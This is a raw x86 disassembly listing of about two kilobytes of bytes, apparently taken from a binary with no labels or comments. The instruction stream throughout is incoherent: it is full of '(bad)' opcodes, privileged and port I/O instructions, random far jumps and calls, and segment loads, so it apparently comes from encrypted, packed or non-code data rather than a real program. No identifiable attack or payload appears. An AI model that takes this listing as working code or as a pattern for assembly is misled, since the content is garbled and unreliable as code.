  44a6b3:	push   ds
  44a6b4:	mov    ecx,0xf6ae220d
  44a6b9:	mov    DWORD PTR [esi+0x2d],0x96660ab7
  44a6c0:	mov    edx,0xf2bf202f
  44a6c5:	test   ebp,ebx
  44a6c7:	ret    
  44a6c8:	xchg   ecx,eax
  44a6c9:	or     DWORD PTR [ebx],0x3
  44a6cc:	jp     0x44a691
  44a6ce:	jle    0x44a717
  44a6d0:	shl    bh,0xa2
  44a6d3:	xchg   DWORD PTR [ecx],ecx
  44a6d5:	xchg   ebp,ebx
  44a6d7:	ret    
  44a6d8:	xchg   ecx,eax
  44a6d9:	fwait
  44a6da:	push   es
  44a6db:	scas   eax,DWORD PTR es:[edi]
  44a6dc:	lahf   
  44a6dd:	int    0xfa
  44a6df:	mov    ah,0x42
  44a6e1:	mov    esp,0x3fae2d91
  44a6e6:	add    cl,BYTE PTR [edi-0x9]
  44a6e9:	sbb    ebx,DWORD PTR [esi+0x761f9a1f]
  44a6ef:	sub    eax,0x8b961bb7
  44a6f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a6f5:	adc    ecx,eax
  44a6f7:	sbb    eax,0xb38e22a2
  44a6fc:	(bad)  
  44a6fd:	aas    
  44a6fe:	retf   0x9bb7
  44a701:	pop    ss
  44a702:	mov    es,ebx
  44a704:	jmp    0xfe1f:0x968e8a5b
  44a70b:	fnclex 
  44a70d:	sbb    esi,DWORD PTR [ebx+0x26fa68b]
  44a713:	mul    DWORD PTR [edx-0x294c51de]
  44a719:	mov    bh,0xca
  44a71b:	mov    bh,0x9b
  44a71d:	aaa    
  44a71e:	mov    es,ebx
  44a720:	pop    bx
  44a722:	mov    cl,BYTE PTR [esi+esi*8-0x6fe22055]
  44a729:	sbb    edx,esi
  44a72b:	xor    DWORD PTR [esi-0x5de375de],esp
  44a731:	push   ds
  44a732:	into   
  44a733:	sub    edx,DWORD PTR [eax]
  44a735:	mov    al,0xb
  44a737:	mov    bh,0xee
  44a739:	inc    eax
  44a73a:	mov    es,WORD PTR [ebp-0x3c7575ca]
  44a740:	stc    
  44a741:	pop    ds
  44a742:	mov    eax,0x692b6103
  44a747:	je     0x44a74f
  44a749:	mov    es,esi
  44a74b:	and    esi,DWORD PTR [eax+0x7426c8cf]
  44a751:	and    eax,0x2b0770fe
  44a756:	mov    bl,ch
  44a758:	(bad)  [edx+0x63]
  44a75b:	ja     0x44a738
  44a75d:	imul   ebp,esp,0xd87256d5
  44a763:	out    0xb6,al
  44a765:	dec    esp
  44a766:	call   ebx
  44a768:	loop   0x44a746
  44a76a:	cmp    al,0x60
  44a76c:	(bad)  
  44a76d:	adc    eax,0x2f18f749
  44a772:	sbb    eax,0x13c2dbf1
  44a777:	push   cs
  44a778:	xor    al,0xad
  44a77a:	fcmovne st,st(7)
  44a77c:	bound  edi,QWORD PTR [ecx]
  44a77e:	mov    dl,BYTE PTR [esp+esi*8]
  44a781:	push   esi
  44a782:	fisubr WORD PTR ds:0xead548bc
  44a788:	xlat   BYTE PTR ds:[ebx]
  44a789:	pop    edi
  44a78a:	(bad)  
  44a78b:	lahf   
  44a78c:	out    0x42,al
  44a78e:	xlat   BYTE PTR ds:[ebx]
  44a78f:	retf   0x621a
  44a792:	xor    BYTE PTR ds:0xc5c85432,ah
  44a798:	(bad)  
  44a799:	dec    ecx
  44a79a:	and    ah,dh
  44a79c:	inc    ecx
  44a79d:	inc    edx
  44a79e:	jmp    0x44a764
  44a7a0:	aam    0xef
  44a7a2:	fwait
  44a7a3:	hlt    
  44a7a4:	cli    
  44a7a5:	inc    edi
  44a7a6:	int    0xe6
  44a7a8:	loop   0x44a79f
  44a7aa:	add    DWORD PTR [esp+edx*8+0x20f14717],ecx
  44a7b1:	xchg   ebx,eax
  44a7b2:	dec    esi
  44a7b3:	es leave 
  44a7b5:	pop    ebx
  44a7b6:	fs and al,0xa8
  44a7b9:	dec    edi
  44a7ba:	(bad)  
  44a7bb:	sub    BYTE PTR [eax-0x2215857d],bh
  44a7c1:	outs   dx,DWORD PTR ds:[esi]
  44a7c2:	out    dx,eax
  44a7c3:	pop    ss
  44a7c4:	push   esi
  44a7c5:	push   edx
  44a7c6:	fmul   QWORD PTR [edi-0x62]
  44a7c9:	inc    ebp
  44a7ca:	jmp    0xd17d4eda
  44a7cf:	icebp  
  44a7d0:	add    bl,BYTE PTR [ecx-0x37]
  44a7d3:	out    dx,al
  44a7d4:	int    0x44
  44a7d6:	cmp    al,0xe7
  44a7d8:	bound  eax,QWORD PTR [edx-0x7c]
  44a7db:	dec    BYTE PTR [eax-0x28]
  44a7de:	mov    esi,0xd743bf4a
  44a7e3:	jecxz  0x44a864
  44a7e5:	dec    esp
  44a7e6:	shr    DWORD PTR [eax],1
  44a7e8:	repnz mov esi,0x6adabdea
  44a7ee:	fsubr  st,st(5)
  44a7f0:	lock lock fwait
  44a7f3:	icebp  
  44a7f4:	in     eax,0x42
  44a7f6:	aam    0x2d
  44a7f8:	mov    dh,0x4e
  44a7fa:	into   
  44a7fb:	mov    ebx,0x36ee6fde
  44a800:	mov    ds:0x6ae43231,al
  44a805:	xchg   ebx,eax
  44a806:	xchg   edi,eax
  44a807:	nop
  44a808:	cli    
  44a809:	push   0xffffffdc
  44a80b:	sub    eax,0xf4cf4862
  44a810:	icebp  
  44a811:	rcl    DWORD PTR [edi+edi*1+0x7b],0x4f
  44a816:	(bad)  [ebx]
  44a818:	and    bl,bh
  44a81a:	rol    DWORD PTR [eax],cl
  44a81c:	push   edi
  44a81d:	or     cl,0xc6
  44a820:	mov    edx,0xb2ed83d4
  44a825:	stos   DWORD PTR es:[edi],eax
  44a826:	das    
  44a827:	out    dx,al
  44a828:	cmc    
  44a829:	or     edi,DWORD PTR [esi+ecx*8]
  44a82c:	bound  esi,QWORD PTR [eax+eiz*1]
  44a82f:	adc    ebp,esi
  44a831:	sahf   
  44a832:	push   eax
  44a833:	jecxz  0x44a819
  44a835:	(bad)  
  44a836:	mov    ebx,0x9f677f98
  44a83b:	push   ss
  44a83c:	and    al,0x2b
  44a83e:	retf   0x6042
  44a841:	jmp    0xef26:0xe568c0a5
  44a848:	idiv   BYTE PTR [eax-0x1d]
  44a84b:	push   0xb1ad7ba2
  44a850:	xchg   ebx,eax
  44a851:	sbb    ebx,DWORD PTR [ebp+0xba31bb3]
  44a857:	xchg   ebp,eax
  44a858:	mov    cl,BYTE PTR [esi-0x2a]
  44a85b:	dec    ebp
  44a85c:	cmp    al,0x4b
  44a85e:	dec    ecx
  44a85f:	or     al,0xc2
  44a861:	das    
  44a862:	enter  0x3fce,0xa7
  44a866:	jmp    0x15f07f28
  44a86b:	imul   ebp,DWORD PTR [esp+edx*8],0xc7df03ee
  44a872:	mov    eax,0x2b7a17c2
  44a877:	inc    edi
  44a878:	out    0x65,eax
  44a87a:	sub    al,0x73
  44a87c:	adc    bl,BYTE PTR [esp+esi*2-0x23]
  44a880:	cs dec edx
  44a882:	(bad)  
  44a884:	dec    BYTE PTR [esi-0x25]
  44a887:	mov    fs,edi
  44a889:	pop    edi
  44a88a:	mov    ecx,0xbb0bd538
  44a88f:	fisttp WORD PTR [edx-0x7b]
  44a892:	and    ebx,DWORD PTR [esi+0x5e]
  44a895:	jnp    0x44a831
  44a897:	int3   
  44a898:	or     eax,0xa4be860f
  44a89d:	in     al,0xe6
  44a89f:	rcl    DWORD PTR [ebx+0xb],1
  44a8a2:	sar    ah,cl
  44a8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a8a5:	hlt    
  44a8a6:	std    
  44a8a7:	mov    eax,0xac9afa2e
  44a8ac:	xchg   ebp,eax
  44a8ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a8ae:	xlat   BYTE PTR ds:[ebx]
  44a8af:	sti    
  44a8b0:	push   0x53a09218
  44a8b5:	inc    ebx
  44a8b6:	fwait
  44a8b7:	dec    esi
  44a8b8:	rcr    BYTE PTR [ebx],cl
  44a8ba:	(bad)  
  44a8bb:	and    al,0x5e
  44a8bd:	cmp    ebx,DWORD PTR [ecx-0x41b050d4]
  44a8c3:	xchg   ebx,eax
  44a8c4:	lods   eax,DWORD PTR ds:[esi]
  44a8c5:	or     al,0x84
  44a8c7:	hlt    
  44a8c8:	out    0x5d,eax
  44a8ca:	and    al,0xf7
  44a8cc:	or     eax,0xb3791624
  44a8d1:	fdivr  DWORD PTR [ecx-0x47]
  44a8d4:	mov    dh,0x73
  44a8d6:	int    0x9a
  44a8d8:	jle    0x44a8e1
  44a8da:	jge    0x44a875
  44a8dc:	test   al,0xdd
  44a8de:	call   0x7aa4:0xdb053b45
  44a8e5:	mov    bl,0x9a
  44a8e7:	mov    edx,0x474a3385
  44a8ec:	and    esi,0xd5c0a7b1
  44a8f2:	xchg   esi,eax
  44a8f3:	jno    0x44a8ac
  44a8f5:	cmp    eax,0x82b5bd9d
  44a8fa:	xchg   ebx,ebx
  44a8fc:	xchg   esi,eax
  44a8fd:	sub    ebx,edx
  44a8ff:	retf   
  44a900:	mov    edi,0xf2b85c1f
  44a905:	shl    BYTE PTR [eax+eiz*1-0x785d4a12],0xe6
  44a90d:	mov    eax,0x1bae84a6
  44a912:	jns    0x44a8e7
  44a914:	xor    dl,BYTE PTR [edi]
  44a916:	mov    eax,0x89f09aae
  44a91b:	pushf  
  44a91c:	sahf   
  44a91d:	repnz call 0x41b9:0x9e74222c
  44a925:	mov    al,ds:0xcafef89a
  44a92a:	shr    BYTE PTR [eax-0x576485fc],cl
  44a930:	xor    al,BYTE PTR [ebx]
  44a932:	retf   
  44a933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a934:	cld    
  44a935:	in     eax,dx
  44a936:	cmp    ch,BYTE PTR [esi+edx*8-0x4d5b7607]
  44a93d:	and    ebx,DWORD PTR [esi-0x6001ced2]
  44a943:	imul   edi,DWORD PTR [edx+0x78],0x65
  44a947:	fisubr WORD PTR [ebx+ecx*1-0x6c8d6137]
  44a94e:	into   
  44a94f:	shl    BYTE PTR [esp+edx*2+0x568ff9ea],1
  44a956:	test   eax,0x5e88e9a7
  44a95b:	xchg   edi,eax
  44a95c:	jo     0x44a9b9
  44a95e:	and    BYTE PTR [esi+0x1c7ff43d],0x63
  44a965:	ins    DWORD PTR es:[edi],dx
  44a966:	push   ebx
  44a967:	daa    
  44a968:	adc    dh,BYTE PTR [ebp-0x72]
  44a96b:	or     al,0x33
  44a96d:	jmp    0x44a9c6
  44a96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a970:	jae    0x44a95c
  44a972:	xchg   ebp,eax
  44a973:	mov    ds:0xd17c0b1,eax
  44a978:	mov    dl,0x84
  44a97a:	sbb    BYTE PTR [esi],dh
  44a97c:	sbb    BYTE PTR [esi],0x82
  44a97f:	call   0x1fc1:0xa6900b76
  44a986:	lock loope 0x44a934
  44a989:	lods   al,BYTE PTR ds:[esi]
  44a98a:	call   0xf354:0x24ce5241
  44a991:	or     al,0xcb
  44a993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a994:	cmp    DWORD PTR [ecx],eax
  44a996:	mov    ebp,0x4ae0557f
  44a99b:	test   al,0xb2
  44a99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a99e:	inc    ebx
  44a99f:	pushf  
  44a9a0:	xbegin 0x763ce56
  44a9a6:	je     0x44a97f
  44a9a8:	or     eax,0xbc8cf899
  44a9ad:	repnz pop ebx
  44a9af:	dec    eax
  44a9b0:	mov    bh,0xcb
  44a9b2:	xor    al,0xc2
  44a9b4:	test   eax,0x8b9d1313
  44a9b9:	arpl   WORD PTR [edx],bx
  44a9bb:	or     esi,esi
  44a9bd:	mov    dl,0xb7
  44a9bf:	and    al,0x98
  44a9c1:	pop    ebx
  44a9c2:	out    0x87,eax
  44a9c4:	mov    dl,0xc8
  44a9c6:	push   eax
  44a9c7:	inc    esp
  44a9c8:	mov    fs,WORD PTR [esi-0x6a]
  44a9cb:	je     0x44aa2a
  44a9cd:	or     al,0xdb
  44a9cf:	xchg   ebx,eax
  44a9d0:	and    BYTE PTR [eax],dl
  44a9d2:	pop    esp
  44a9d3:	daa    
  44a9d4:	xchg   edx,eax
  44a9d5:	mov    cl,0xef
  44a9d7:	pop    es
  44a9d8:	xchg   esi,eax
  44a9d9:	add    al,0x61
  44a9db:	xor    eax,0xc9d3f4bd
  44a9e0:	lock or ah,BYTE PTR [edi-0x60]
  44a9e4:	aas    
  44a9e5:	xchg   DWORD PTR [esi+0x7f],ebp
  44a9e8:	scas   al,BYTE PTR es:[edi]
  44a9e9:	or     ecx,DWORD PTR [eax]
  44a9eb:	mov    dh,0x74
  44a9ed:	mov    dh,ah
  44a9ef:	fdiv   st,st(1)
  44a9f1:	cmp    DWORD PTR [ebp-0x65fc664d],eax
  44a9f7:	add    DWORD PTR [ebx+ebx*2],ebp
  44a9fa:	add    BYTE PTR [esi+edi*4-0x9755cf5],dl
  44aa01:	jg     0x44aa14
  44aa03:	gs xchg ebx,eax
  44aa05:	adc    ebx,DWORD PTR [edx+0x3ca469a4]
  44aa0b:	pusha  
  44aa0c:	xor    ebp,eax
  44aa0e:	xchg   esi,eax
  44aa0f:	mov    edx,0xa7a38631
  44aa14:	mov    eax,ds:0x96283699
  44aa19:	sbb    al,0xa7
  44aa1b:	retf   
  44aa1c:	add    BYTE PTR [ebx],cl
  44aa1e:	adc    al,0xe1
  44aa20:	inc    ebp
  44aa21:	and    edx,edi
  44aa23:	push   ebx
  44aa24:	jecxz  0x44aa2e
  44aa26:	bound  edi,QWORD PTR [ecx]
  44aa28:	mov    ds:0x6a9c63b8,al
  44aa2d:	xor    al,0xe9
  44aa2f:	int    0xb2
  44aa31:	mov    al,ds:0x48fc165d
  44aa36:	dec    eax
  44aa37:	cs iret 
  44aa39:	or     ebx,DWORD PTR [edx]
  44aa3b:	and    ch,BYTE PTR [ecx+0x7f]
  44aa3e:	mov    cs,esi
  44aa40:	xor    esi,ecx
  44aa42:	call   0x2152:0x1704adf6
  44aa49:	inc    edi
  44aa4a:	xchg   DWORD PTR [eax-0x587d2b06],edi
  44aa50:	push   ss
  44aa51:	cli    
  44aa52:	cmp    DWORD PTR [ebx-0x5566ef12],edi
  44aa58:	add    cl,BYTE PTR [eax+0x8]
  44aa5b:	(bad)  
  44aa5c:	mov    al,0xd3
  44aa5e:	fild   QWORD PTR [esi+edi*4]
  44aa61:	or     ecx,DWORD PTR [ecx]
  44aa63:	xor    edi,esp
  44aa65:	dec    esp
  44aa66:	mov    ds:0x6a373b24,eax
  44aa6b:	mov    eax,0x9171bbb2
  44aa70:	cs int3 
  44aa72:	adc    BYTE PTR [eax+0x39],dl
  44aa75:	ja     0x44a9ff
  44aa77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44aa78:	sub    al,ah
  44aa7a:	adc    edx,ecx
  44aa7c:	aas    
  44aa7d:	pop    edi
  44aa7e:	test   al,0x43
  44aa80:	mov    bl,0xd8
  44aa82:	call   0x4dc5:0xb6878a30
  44aa89:	or     DWORD PTR [ecx-0x60],esi
  44aa8c:	lods   al,BYTE PTR ds:[esi]
  44aa8d:	xchg   edi,eax
  44aa8e:	mov    esi,0xd83b1477
  44aa93:	xchg   DWORD PTR [ebp+0x5b2d9a77],ebp
  44aa99:	mov    cs,WORD PTR [eax-0x35567c15]
  44aa9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aaa0:	cmp    dl,dl
  44aaa2:	mov    ds:0x450379ee,eax
  44aaa7:	mov    bh,0xb2
  44aaa9:	adc    al,0x19
  44aaab:	pop    esi
  44aaac:	mov    dh,0xef
  44aaae:	cmp    DWORD PTR [esi+esi*8+0x75ade70b],esp
  44aab5:	lods   eax,DWORD PTR ds:[esi]
  44aab6:	and    BYTE PTR [ebx],0x2d
  44aab9:	cmp    al,0x99
  44aabb:	dec    esp
  44aabc:	mov    esi,0x9349452d
  44aac1:	shl    BYTE PTR [ebx-0x5c],cl
  44aac4:	sub    dl,0x8a
  44aac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44aac9:	imul   esp,DWORD PTR [ecx+0x1804e6af],0xffffffb2
  44aad0:	mov    dl,0x61
  44aad2:	fs gs dec ebx
  44aad5:	fcomp  DWORD PTR [ecx+0x710bb4e5]
  44aadb:	jp     0x44aa76
  44aadd:	enter  0x540a,0x39
  44aae1:	shl    BYTE PTR [edx+0x66],cl
  44aae4:	mov    dl,0xc9
  44aae6:	jp     0x44ab54
  44aae8:	cmp    eax,DWORD PTR [ecx]
  44aaea:	xlat   BYTE PTR ds:[ebx]
  44aaeb:	xchg   edx,eax
  44aaec:	and    edx,DWORD PTR ds:0xcf406f8b
  44aaf2:	push   ss
  44aaf3:	or     dh,dl
  44aaf5:	mov    ebp,DWORD PTR [ebx-0x62356789]
  44aafb:	dec    ebp
  44aafc:	push   esi
  44aafd:	or     al,0x4b
  44aaff:	pushf  
  44ab00:	inc    edx
  44ab01:	js     0x44aad9
  44ab03:	arpl   WORD PTR [eax+0x5],si
  44ab06:	or     esi,DWORD PTR [ebx+0x4f75b182]
  44ab0c:	adc    eax,0xc7e7b4db
  44ab11:	fldl2t 
  44ab13:	lods   eax,DWORD PTR ds:[esi]
  44ab14:	mov    dl,0x96
  44ab16:	push   cs
  44ab17:	mov    ?,esi
  44ab19:	pop    edi
  44ab1a:	dec    ebp
  44ab1b:	or     edi,edx
  44ab1d:	xor    eax,0x2a329493
  44ab22:	push   esi
  44ab23:	test   al,0x2e
  44ab25:	leave  
  44ab26:	add    ebp,DWORD PTR [esi]
  44ab28:	mov    dl,0x27
  44ab2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ab2b:	mov    ebx,0x2ab21a30
  44ab30:	cmp    eax,0x56ef520b
  44ab35:	inc    ecx
  44ab36:	sbb    DWORD PTR [edi-0x1d65f7b0],edx
  44ab3c:	mov    ds:0x6d0c64e2,al
  44ab41:	add    eax,0xb99590f
  44ab46:	pop    eax
  44ab47:	call   0xdf17ca8c
  44ab4c:	fwait
  44ab4d:	rcl    DWORD PTR [ebp+0xa28dc2e],0x80
  44ab54:	mov    ds:0x30acca87,al
  44ab59:	cli    
  44ab5a:	fstp   DWORD PTR [edi-0x12]
  44ab5d:	or     esi,DWORD PTR [esi-0x70707d9f]
  44ab63:	outs   dx,DWORD PTR ds:[esi]
  44ab64:	jae    0x44ab48
  44ab66:	call   0x3456:0xa1c1bb2b
  44ab6d:	jae    0x44ab96
  44ab6f:	pop    ss
  44ab70:	or     esp,DWORD PTR es:[ecx]
  44ab73:	sub    eax,0xd256d198
  44ab78:	mov    cl,0x15
  44ab7a:	loope  0x44aba6
  44ab7c:	mov    eax,ds:0xb2459804
  44ab81:	pop    es
  44ab82:	push   es
  44ab83:	xor    eax,0xa73d259b
  44ab88:	pop    ebx
  44ab89:	fcomp  DWORD PTR ds:0x5b9d2568
  44ab8f:	inc    esp
  44ab90:	and    ch,dl
  44ab92:	call   0x57b1:0xbc5c4b26
  44ab99:	adc    DWORD PTR [edx+0x761790a7],edx
  44ab9f:	and    bl,BYTE PTR [ebx+0x2f]
  44aba2:	jmp    0x44abc1
  44aba4:	mov    cl,0x22
  44aba6:	xchg   ebx,eax
  44aba7:	dec    edi
  44aba8:	push   esi
  44aba9:	inc    esp
  44abaa:	mov    edi,DWORD PTR [edi]
  44abac:	inc    esi
  44abad:	mov    BYTE PTR [eax+0x4c],cl
  44abb0:	jo     0x44ac1d
  44abb2:	jmp    0x44abd6
  44abb4:	jnp    0x44abc1
  44abb6:	xchg   ebp,eax
  44abb7:	and    ebp,ebx
  44abb9:	cmovg  ebx,DWORD PTR [eax]
  44abbc:	and    ecx,DWORD PTR [ebp-0x65]
  44abbf:	inc    eax
  44abc0:	mov    al,ds:0x3ed5896
  44abc5:	add    dh,BYTE PTR [esi-0x11]
  44abc8:	jp     0x44abd6
  44abca:	or     BYTE PTR [esi+edi*4+0x3847db17],0x1f
  44abd2:	mov    al,ds:0xa397b2a3
  44abd7:	pop    eax
  44abd8:	cmp    ebp,DWORD PTR [ebx+0xb201e24]
  44abde:	jae    0x44aba8
  44abe0:	loop   0x44ab6a
  44abe2:	jge    0x44ac36
  44abe4:	jmp    0xcf04:0xb83fa72e
  44abeb:	inc    ebx
  44abec:	and    ch,BYTE PTR [eax]
  44abee:	pop    ebx
  44abef:	pop    edx
  44abf0:	inc    ebx
  44abf1:	fwait
  44abf2:	push   eax
  44abf3:	loope  0x44ac58
  44abf5:	xor    dh,BYTE PTR [esi-0x4eb6c212]
  44abfb:	xchg   edi,eax
  44abfc:	xor    cl,BYTE PTR [edi-0x77]
  44abff:	aad    0x40
  44ac01:	cmp    DWORD PTR [ecx+0x46ba923],ebx
  44ac07:	cs fwait
  44ac09:	mov    ds:0x837fd3b,eax
  44ac0e:	loopne 0x44ac43
  44ac10:	imul   BYTE PTR [esi]
  44ac12:	jno    0x44abee
  44ac14:	pop    edx
  44ac15:	pop    edi
  44ac16:	mov    ecx,0xb170b2c7
  44ac1b:	fwait
  44ac1c:	and    bl,BYTE PTR [ecx+ebp*2+0x2b]
  44ac20:	cli    
  44ac21:	loope  0x44ac02
  44ac23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ac24:	lods   al,BYTE PTR ds:[esi]
  44ac25:	jb     0x44ac85
  44ac27:	push   es
  44ac28:	xor    BYTE PTR [esi],0x30
  44ac2b:	inc    ebx
  44ac2c:	mov    dl,0x80
  44ac2e:	add    edi,DWORD PTR [bx+si]
  44ac31:	idiv   ebp
  44ac33:	mov    dh,0xae
  44ac35:	or     edx,DWORD PTR [ecx+0x16]
  44ac38:	lock and ecx,ebp
  44ac3b:	pop    eax
  44ac3c:	jo     0x44ac76
  44ac3e:	call   0xfb66:0xa12ef46e
  44ac45:	mov    bh,0x7b
  44ac47:	mov    ecx,0x6091e7c8
  44ac4c:	xchg   ebp,eax
  44ac4d:	sbb    ebx,DWORD PTR [eax]
  44ac4f:	mul    DWORD PTR [edx+0x1f]
  44ac52:	pop    ebp
  44ac53:	or     bl,BYTE PTR [edi+ebx*2-0x62]
  44ac57:	das    
  44ac58:	mov    BYTE PTR [ebx-0x28],bl
  44ac5b:	xor    ch,BYTE PTR cs:0xbe5148b
  44ac62:	or     ebx,DWORD PTR [ebp-0x6d]
  44ac65:	sub    eax,0x12b17d5
  44ac6a:	call   0xfe2a:0xc6eb6444
  44ac71:	add    dl,BYTE PTR [ecx-0x62c04501]
  44ac77:	or     DWORD PTR [esi+0x43],ecx
  44ac7a:	cdq    
  44ac7b:	adc    DWORD PTR [ebx+0x5d],ebx
  44ac7e:	outs   dx,BYTE PTR ds:[esi]
  44ac7f:	jecxz  0x44ac33
  44ac81:	sub    ah,BYTE PTR [eax-0x4b]
  44ac84:	sbb    dh,BYTE PTR gs:[eax]
  44ac87:	sti    
  44ac88:	or     cl,BYTE PTR [eax]
  44ac8a:	retf   
  44ac8b:	cmc    
  44ac8c:	mov    dh,0x56
  44ac8e:	push   edx
  44ac8f:	lea    esi,[ebx+0x25]
  44ac92:	jecxz  0x44ad0f
  44ac94:	xor    al,0x38
  44ac96:	call   0x831a:0xb23cb01b
  44ac9d:	add    esi,edi
  44ac9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aca0:	jo     0x44ac82
  44aca2:	mov    ebx,0x12c4d33b
  44aca7:	es mov dl,0x25
  44acaa:	xchg   edx,eax
  44acab:	ds cmc 
  44acad:	sbb    eax,DWORD PTR [edi+0x470b9f51]
  44acb3:	dec    esp
  44acb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44acb5:	into   
  44acb6:	stos   BYTE PTR es:[edi],al
  44acb7:	sbb    al,0x90
  44acb9:	ficomp WORD PTR [edx-0x6d77f0c9]
  44acbf:	mov    bl,0x2b
  44acc1:	jb     0x44ac52
  44acc3:	test   eax,0x89ad53ac
  44acc8:	push   edx
  44acc9:	(bad)  
  44acca:	nop
  44accb:	dec    esp
  44accc:	mov    al,ds:0xb6d49365
  44acd1:	push   ebp
  44acd2:	pop    ss
  44acd3:	daa    
  44acd4:	icebp  
  44acd5:	or     bh,BYTE PTR [eax]
  44acd7:	mov    eax,DWORD PTR [edx-0x38994cf5]
  44acdd:	scas   eax,DWORD PTR es:[edi]
  44acde:	adc    DWORD PTR [ebx],esi
  44ace0:	mov    eax,0x615d9a8b
  44ace5:	in     al,dx
  44ace6:	mov    cl,0x48
  44ace8:	mov    cl,0x2d
  44acea:	inc    edi
  44aceb:	aas    
  44acec:	cli    
  44aced:	or     edx,DWORD PTR [ebx+0x572eb6b7]
  44acf3:	mov    edi,0xb884bd76
  44acf8:	retf   
  44acf9:	in     eax,0x19
  44acfb:	cmp    dh,BYTE PTR [ebp-0x31a89eb8]
  44ad01:	push   cs
  44ad02:	outs   dx,DWORD PTR ds:[esi]
  44ad03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ad04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ad05:	mov    esp,0xde926d04
  44ad0a:	sbb    ch,BYTE PTR [edi-0x536568c1]
  44ad10:	jb     0x44ad1f
  44ad12:	xor    DWORD PTR [eax],ecx
  44ad14:	push   ss
  44ad15:	pop    ebp
  44ad16:	mul    DWORD PTR [edi+0x12b67862]
  44ad1c:	sub    esp,ebx
  44ad1e:	mov    ebx,0x88dab3b2
  44ad23:	aad    0x1
  44ad25:	jmp    0xd630:0x81924a19
  44ad2c:	pop    eax
  44ad2d:	add    dl,ah
  44ad2f:	out    0xfa,eax
  44ad31:	icebp  
  44ad32:	sbb    al,BYTE PTR [eax+0xa]
  44ad35:	ror    edx,1
  44ad37:	jnp    0x44aceb
  44ad39:	jne    0x44ad8b
  44ad3b:	cwde   
  44ad3c:	arpl   dx,si
  44ad3e:	or     BYTE PTR [edx-0x4d],al
  44ad41:	or     ebx,DWORD PTR [esp+ebx*2-0x3849f681]
  44ad48:	mov    esp,0xcf979dbc
  44ad4d:	sbb    BYTE PTR [ecx-0x68],cl
  44ad50:	inc    edx
  44ad51:	adc    dh,0xe6
  44ad54:	jnp    0x44ad64
  44ad56:	mov    edx,0x2681d5a6
  44ad5b:	daa    
  44ad5c:	iret   
  44ad5d:	loopne 0x44ad3e
  44ad5f:	xor    BYTE PTR [ecx+0x2a27d210],cl
  44ad65:	invd   
  44ad67:	arpl   WORD PTR [esi+0x6347b491],di
  44ad6d:	or     esi,DWORD PTR [edx-0x5c]
  44ad70:	pop    edi
  44ad71:	xor    BYTE PTR [edx-0x2b],ch
  44ad74:	outs   dx,DWORD PTR ds:[esi]
  44ad75:	rcr    DWORD PTR [edx-0x2536cb6f],0x4e
  44ad7c:	imul   ebp,DWORD PTR [edi+0x7712a74b],0x9830ab12
  44ad86:	shr    BYTE PTR [esi-0x4e],1
  44ad89:	out    dx,al
  44ad8a:	sahf   
  44ad8b:	or     esp,0x3b
  44ad8e:	jno    0x44ad42
  44ad90:	xchg   BYTE PTR [ecx],dh
  44ad92:	in     al,dx
  44ad93:	add    bh,BYTE PTR [ecx+0x67f17a14]
  44ad99:	or     ebx,DWORD PTR [ebp+0x20]
  44ad9c:	aas    
  44ad9d:	add    dh,dh
  44ad9f:	push   es
  44ada0:	dec    esp
  44ada1:	(bad)  
  44ada2:	cli    
  44ada3:	jle    0x44ad7b
  44ada5:	std    
  44ada6:	sbb    DWORD PTR [ebp-0x5855a454],esi
  44adac:	sbb    ah,ch
  44adae:	pop    edi
  44adaf:	pop    edx
  44adb0:	call   0x9e05:0xae899a96
  44adb7:	add    cl,BYTE PTR [edx-0xc]
  44adba:	jle    0x44ad65
  44adbc:	call   DWORD PTR [ebx]
  44adbe:	and    edi,DWORD PTR [ecx-0x5aa6774e]
  44adc4:	mov    edx,esp
  44adc6:	call   0x99ac:0x8337fad0
  44adcd:	neg    BYTE PTR [ecx+0x102a10a7]
  44add3:	mov    al,0xea
  44add5:	dec    esi
  44add6:	jbe    0x44adc4
  44add8:	mov    dl,0xe
  44adda:	adc    dh,BYTE PTR [ebx+0x6ddd4a9b]
  44ade0:	mov    ebp,0xb3f78253
  44ade5:	ins    DWORD PTR es:[edi],dx
  44ade6:	(bad)  
  44ade7:	pop    ebp
  44ade8:	xor    bl,ah
  44adea:	add    eax,0x879737d7
  44adef:	xor    esp,DWORD PTR [ecx+0x12]
  44adf2:	pop    eax
  44adf3:	dec    esp
  44adf4:	or     ebp,DWORD PTR [esi]
  44adf6:	and    ah,BYTE PTR [edi-0x49]
  44adf9:	pop    es
  44adfa:	(bad)  
  44adfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44adfc:	jle    0x44ada5
  44adfe:	fwait
  44adff:	pop    ecx
  44ae00:	pop    esi
  44ae01:	inc    esp
  44ae02:	mov    ch,BYTE PTR [eax+esi*4-0x35f632ae]
  44ae09:	aas    
  44ae0a:	dec    edx
  44ae0b:	(bad)  
  44ae0c:	dec    eax
  44ae0d:	lsl    esp,WORD PTR [edi-0x1362fdf5]
  44ae14:	inc    ebp
  44ae15:	repnz and al,0xa2
  44ae18:	mov    dl,0x0
  44ae1a:	add    cl,BYTE PTR [ebx-0x62]
  44ae1d:	popa   
  44ae1e:	mov    ds:0xa90bdaa3,al
  44ae23:	mov    bh,0xa5
  44ae25:	rcr    DWORD PTR [ebx+ebx*4+0x509b9272],0x4c
  44ae2d:	fmul   st(6),st
  44ae2f:	mov    edi,0x26eb175e
  44ae34:	dec    edx
  44ae35:	mov    cl,0x53
  44ae37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
